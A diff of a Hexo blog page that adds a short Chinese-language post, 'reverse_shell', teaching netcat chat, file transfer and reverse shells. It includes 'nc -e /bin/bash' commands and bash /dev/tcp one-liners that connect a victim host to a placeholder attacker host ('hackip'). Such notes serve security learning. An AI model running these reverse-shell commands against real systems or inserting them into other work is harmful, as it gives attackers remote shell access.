@@ -23,7 +23,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="Lofi_Master">
+        <meta property="og:title" content="reverse_shell">
     
 
     <!--Open Graph Description-->
@@ -36,7 +36,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website">
+        <meta property="og:type" content="article">
     
 
     <!--Page Cover-->
@@ -55,7 +55,7 @@
 
     <!-- Title -->
     
-    <title>Archives: 2019/8 - Lofi_Master</title>
+    <title>reverse_shell - Lofi_Master</title>
 
     <!-- Bootstrap Core CSS -->
     <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
@@ -157,75 +157,85 @@
 </nav>
 
     <!-- Main Content -->
-    
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
 
-<!-- Page Header -->
-<!-- Set your background image for this header in the theme's configuration: index_cover -->
 <header class="intro-header" style="background-image: url('http://www.codeblocq.com/assets/projects/hexo-theme-clean-blog/img/home-bg.jpg')">
     <div class="container">
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <div class="site-heading">
-                    <h1>2019/8</h1>
+                <div class="post-heading">
+                    <h1>reverse_shell</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2019-08-11
+                        
+                    </span>
                 </div>
             </div>
         </div>
     </div>
 </header>
 
-<!-- Main Content -->
-<div class="container">
-    <div class="row">
-        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
             
-                <div class="post-preview">
-    <a href="/2019/08/13/error-based-injection/">
-        <h1 class="post-title archive">
-            MySQL报错注入
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-13
-    </p>
-</div>
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h3 id="1、nc"><a href="#1、nc" class="headerlink" title="1、nc"></a>1、nc</h3><p><strong>（1）聊天</strong></p>
+<p>发送端A：nc -lvvp  ip_B  port_A</p>
+<p>接收端B：nc  ip_A  port_A</p>
+<p>参数含义：-l  监听模式   -v  显示详细信息  -vv  显示更详细的信息   -p  指定本地监听的端口</p>
+<p>ctrl+C断开当前连接。</p>
+<p><strong>（2）文件传输</strong></p>
+<p>内网转发到公网</p>
+<p>​        发送端A（内网）：nc ip_B port_B &lt; 文件名 -q 1</p>
+<p>​        接收端B（公网）：nc -lvvp port_B &gt; 文件名</p>
+<p>公网转发到内网</p>
+<p>​        发送端A（公网）：nc -lvvp port_A &lt; 文件名 -q 1</p>
+<p>​        接收端B（内网）：nc  ip_A port_A &gt; 文件名</p>
+<p>参数含义：-q  标准输入结束后延时（以秒为单位）再退出连接。上面的意思是发送端发送文件结束后。延时1s后断开连接。</p>
+<p><strong>（3）反弹shell</strong></p>
+<p>内网反弹到到公网</p>
+<p>​        发送端A（内网）：nc ip_B port_B -e /bin/bash</p>
+<p>​        接收端B（公网）：nc -lvvp port_B</p>
+<p>公网反弹到到内网</p>
+<p>​        发送端A（公网）：nc -lvvp port_A -e /bin/bash</p>
+<p>​        接收端B（内网）：nc  ip_A port_A </p>
+<p>参数含义：-e  连接成功后要执行的程序名</p>
+<p>当目标为linux系统时，shell一般为bash；若目标为windows时，把上面的/bin/bash改成cmd.exe </p>
+<p>若反弹回来的cmd shell有中文乱码，在shell输入命令chcp 65001则可以解决这个问题。</p>
+<p>65001代表utf8编码，936代表GBK编码。</p>
+<h3 id="2、bash反弹"><a href="#2、bash反弹" class="headerlink" title="2、bash反弹"></a>2、bash反弹</h3><p>接收端(hackip,公网)：nc -lvvp 端口</p>
+<p>发送端(受害者)：bash -i &gt;&amp; /dev/tcp/hackip/hack端口 0&gt;&amp;1</p>
+<p>发送端(受害者)：0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/hackip/hack端口;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
             
-                <div class="post-preview">
-    <a href="/2019/08/11/reverse-shell/">
-        <h1 class="post-title archive">
-            reverse_shell
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-11
-    </p>
-</div>
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
             
-                <div class="post-preview">
-    <a href="/2019/08/03/hello-world/">
-        <h1 class="post-title archive">
-            Hello World
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-03
-    </p>
-</div>
-            
-            <div class="archive-before-pagination"></div>
-            <ul class="pager">
-    
-    
-</ul>
         </div>
     </div>
-</div>
-
+</article>
 
     <!-- Footer -->
     <hr />
